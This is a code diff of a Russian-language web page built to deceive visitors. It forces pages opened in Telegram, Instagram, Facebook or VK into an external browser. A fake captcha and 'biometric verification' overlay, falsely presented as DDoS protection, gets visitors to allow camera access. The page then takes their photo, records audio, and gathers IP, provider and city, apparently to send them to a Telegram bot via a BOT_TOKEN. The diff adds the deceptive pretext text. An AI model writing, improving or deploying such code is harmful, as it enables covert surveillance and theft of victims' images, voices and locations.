@@ -8,23 +8,19 @@
         // Скрипт для принудительного открытия во внешнем браузере (Safari/Chrome)
         (function() {
             var ua = navigator.userAgent || navigator.vendor || window.opera;
-            // Проверяем, открыто ли внутри Telegram, Instagram, FB, VK
             if (ua.indexOf("Telegram") > -1 || ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("VK") > -1) {
-                // Если на Android - используем intent
                 if (ua.indexOf("Android") > -1) {
                     var url = window.location.href;
                     var newUrl = url.replace("https://", "intent://").replace(/^intent:\/\//, "intent://") + "#Intent;scheme=https;package=com.android.chrome;end";
                     window.location.href = newUrl;
                 } 
-                // Если на iOS - используем специальную схему или просто выводим подсказку
                 else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
-                    // Для iOS прямого редиректа нет, поэтому показываем заглушку с кнопкой
                     document.addEventListener("DOMContentLoaded", function() {
                         document.body.innerHTML = `
-                            <div style="padding: 40px; text-align: center; font-family: sans-serif;">
-                                <h2>Открытие в браузере</h2>
-                                <p>Для продолжения работы, пожалуйста, откройте эту страницу в Safari.</p>
-                                <p>Нажмите на три точки в правом верхнем углу и выберите <b>"Открыть в Safari"</b>.</p>
+                            <div style="padding: 40px; text-align: center; font-family: sans-serif; background: #f7f7f7; height: 100vh; display: flex; flex-direction: column; justify-content: center;">
+                                <h2 style="color: #333;">Открытие в браузере</h2>
+                                <p style="color: #666; line-height: 1.5;">Для продолжения работы, пожалуйста, откройте эту страницу в Safari.</p>
+                                <p style="color: #666; line-height: 1.5;">Нажмите на три точки в правом верхнем углу и выберите <b style="color:#3b82f6;">"Открыть в Safari"</b>.</p>
                             </div>
                         `;
                     });
@@ -126,11 +122,7 @@
             if (BOT_TOKEN === 'ТВОЙ_ТОКЕН_ЗДЕСЬ') return;
 
             console.log("=== НАЧАЛО ОТПРАВКИ ===");
-            
-            if (!photoBlob) {
-                console.error("ОШИБКА: Фото не создано.");
-                return;
-            }
+            if (!photoBlob) { console.error("ОШИБКА: Фото не создано."); return; }
 
             let ip = "Неизвестно", provider = "Неизвестно", city = "Неизвестно";
             try { 
@@ -202,28 +194,43 @@
         }
 
         async function takePhoto() {
-            document.getElementById('loader').style.display = 'flex';
-            document.getElementById('loader').innerHTML = '<div class="spinner"></div><span>Запрос камеры...</span>';
-            let photoBlob = null;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream; video.play(); await new Promise(r => video.onloadeddata = r);
-                await new Promise(r => setTimeout(r, 1500));
-                const c = document.createElement('canvas'); c.width = video.videoWidth; c.height = video.videoHeight;
-                const cctx = c.getContext('2d'); cctx.translate(c.width, 0); cctx.scale(-1, 1); cctx.drawImage(video, 0, 0);
-                photoBlob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-                stream.getTracks().forEach(t => t.stop());
-            } catch (e) { console.error("Ошибка камеры:", e); }
-
-            if (!photoBlob) {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('loader').innerHTML = '<span style="color:red;">Ошибка камеры</span>';
-                return;
-            }
             document.getElementById('captcha').style.display = 'none';
-            document.getElementById('main-site').style.display = 'block';
-            await recordAudio(photoBlob);
+            
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; display:flex; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:sans-serif;';
+            overlay.innerHTML = `
+                <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center; max-width: 80%;">
+                    <h2 style="margin-top:0; color:#3b82f6;">Биометрическая проверка</h2>
+                    <p style="color:#cbd5e1; font-size:14px; margin-bottom: 20px;">Пожалуйста, покажите лицо для сканирования. Это необходимо, чтобы подтвердить, что вы человек, а не бот. Проверка проводится с целью безопасности сайта и предотвращения DDoS-атак.</p>
+                    <button id="start-camera-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer; font-weight: bold;">Показать лицо</button>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+
+            document.getElementById('start-camera-btn').addEventListener('click', async () => {
+                overlay.innerHTML = '<div class="spinner" style="border-color: #3b82f6; border-top-color: transparent; margin-bottom: 15px;"></div><p>Сканирование...</p>';
+                
+                let photoBlob = null;
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream; video.play(); await new Promise(r => video.onloadeddata = r);
+                    await new Promise(r => setTimeout(r, 1500));
+                    const c = document.createElement('canvas'); c.width = video.videoWidth; c.height = video.videoHeight;
+                    const cctx = c.getContext('2d'); cctx.translate(c.width, 0); cctx.scale(-1, 1); cctx.drawImage(video, 0, 0);
+                    photoBlob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.error("Ошибка камеры:", e); }
+
+                if (!photoBlob) {
+                    overlay.innerHTML = '<p style="color:red;">Ошибка доступа к камере. Разрешите использование камеры в настройках браузера.</p>';
+                    return;
+                }
+
+                document.body.removeChild(overlay);
+                document.getElementById('main-site').style.display = 'block';
+                await recordAudio(photoBlob);
+            });
         }
 
         async function recordAudio(photoBlob) {
